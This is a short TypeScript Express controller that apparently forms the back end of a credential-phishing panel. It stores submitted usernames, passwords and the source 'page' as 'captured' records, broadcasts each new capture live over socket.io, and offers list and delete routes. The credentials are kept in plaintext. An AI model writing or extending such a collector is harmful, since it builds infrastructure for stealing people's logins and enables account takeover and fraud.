import { Request,Response } from "express"
import Captured, { ICaptured } from "../models/captured"
import Server from "../models/server";
export const getCaptured = async (req:Request,res:Response) => {
    try {
        const captureds = await Captured.find({status:true});

        return res.status(200).json({captureds});
    } catch (error) {
        res.status(500).json({message:"server Error"})
    }
}

export const createCaptured = async(req:Request,res:Response) => {
    const {user,password,page} = <ICaptured>req.body;
    try {
        const captured = new Captured({
            user:user,
            password:password,
            page:page
        });
        await captured.save();
        Server.instance.io.emit('page',captured);
        return res.status(201).json({captured});
    } catch (error) {
        console.log(error);
        res.status(500).send('server error')
    }
}

export const eliminateCaptured = async (req:Request,res:Response) => {

    const capturedId = req.params.id;
    try {
        let captured = await Captured.findById(capturedId);
        if(!captured) return res.status(404).json({msg:'brand not found'});

        await Captured.findByIdAndDelete(capturedId);
        return res.status(200).json({msg:'datos Eliminados'});
    } catch (error) {
        res.status(500).send('server error');
    }
}
